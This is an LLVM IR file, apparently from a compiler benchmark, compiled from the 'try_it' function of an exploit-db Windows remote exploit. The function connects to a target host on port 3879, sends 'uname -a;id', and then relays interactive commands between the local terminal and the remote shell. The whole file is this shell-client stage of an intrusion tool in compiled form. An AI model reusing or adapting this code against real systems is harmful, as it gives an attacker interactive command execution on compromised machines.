; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_20582.c_try_it.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_20582.c_try_it.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i32 }
%struct.sock_addr = type { i32 }

@.str = private unnamed_addr constant [9 x i8] c"trying!\0A\00", align 1
@ip = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [26 x i8] c"sorry.. it did'nt worked\0A\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"uname -a;id\0A\00", align 1
@stdin = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @try_it() #0 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca i32, align 4
  %3 = alloca [1000 x i8], align 16
  %4 = alloca i32, align 4
  %5 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0))
  %6 = load i32, i32* @ip, align 4
  %7 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 2
  %8 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %7, i32 0, i32 0
  store i32 %6, i32* %8, align 4
  %9 = call i32 @htons(i32 3879)
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 1
  store i32 %9, i32* %10, align 4
  %11 = load i32, i32* @AF_INET, align 4
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 0
  store i32 %11, i32* %12, align 4
  %13 = load i32, i32* @AF_INET, align 4
  %14 = load i32, i32* @SOCK_STREAM, align 4
  %15 = call i32 @socket(i32 %13, i32 %14, i32 0)
  store i32 %15, i32* %2, align 4
  %16 = load i32, i32* %2, align 4
  %17 = bitcast %struct.sockaddr_in* %1 to %struct.sock_addr*
  %18 = call i32 @connect(i32 %16, %struct.sock_addr* %17, i32 12)
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %23

20:                                               ; preds = %0
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0))
  %22 = call i32 @exit(i32 0) #3
  unreachable

23:                                               ; preds = %0
  %24 = getelementptr inbounds [1000 x i8], [1000 x i8]* %3, i64 0, i64 0
  %25 = call i32 @strcpy(i8* %24, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0))
  %26 = load i32, i32* %2, align 4
  %27 = getelementptr inbounds [1000 x i8], [1000 x i8]* %3, i64 0, i64 0
  %28 = getelementptr inbounds [1000 x i8], [1000 x i8]* %3, i64 0, i64 0
  %29 = call i32 @strlen(i8* %28)
  %30 = call i32 @send(i32 %26, i8* %27, i32 %29, i32 0)
  br label %31

31:                                               ; preds = %23, %62
  %32 = getelementptr inbounds [1000 x i8], [1000 x i8]* %3, i64 0, i64 0
  %33 = call i32 @memset(i8* %32, i32 0, i32 1000)
  %34 = call i32 @FD_ZERO(i32* %4)
  %35 = call i32 @FD_SET(i32 0, i32* %4)
  %36 = load i32, i32* %2, align 4
  %37 = call i32 @FD_SET(i32 %36, i32* %4)
  %38 = load i32, i32* %2, align 4
  %39 = add nsw i32 %38, 1
  %40 = call i32 @select(i32 %39, i32* %4, i32* null, i32* null, i32* null)
  %41 = call i64 @FD_ISSET(i32 0, i32* %4)
  %42 = icmp ne i64 %41, 0
  br i1 %42, label %43, label %52

43:                                               ; preds = %31
  %44 = getelementptr inbounds [1000 x i8], [1000 x i8]* %3, i64 0, i64 0
  %45 = load i32, i32* @stdin, align 4
  %46 = call i32 @fgets(i8* %44, i32 1000, i32 %45)
  %47 = load i32, i32* %2, align 4
  %48 = getelementptr inbounds [1000 x i8], [1000 x i8]* %3, i64 0, i64 0
  %49 = getelementptr inbounds [1000 x i8], [1000 x i8]* %3, i64 0, i64 0
  %50 = call i32 @strlen(i8* %49)
  %51 = call i32 @send(i32 %47, i8* %48, i32 %50, i32 0)
  br label %52

52:                                               ; preds = %43, %31
  %53 = load i32, i32* %2, align 4
  %54 = call i64 @FD_ISSET(i32 %53, i32* %4)
  %55 = icmp ne i64 %54, 0
  br i1 %55, label %56, label %62

56:                                               ; preds = %52
  %57 = load i32, i32* %2, align 4
  %58 = getelementptr inbounds [1000 x i8], [1000 x i8]* %3, i64 0, i64 0
  %59 = call i32 @recv(i32 %57, i8* %58, i32 1000, i32 0)
  %60 = getelementptr inbounds [1000 x i8], [1000 x i8]* %3, i64 0, i64 0
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %60)
  br label %62

62:                                               ; preds = %56, %52
  br label %31
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sock_addr*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @fgets(i8*, i32, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
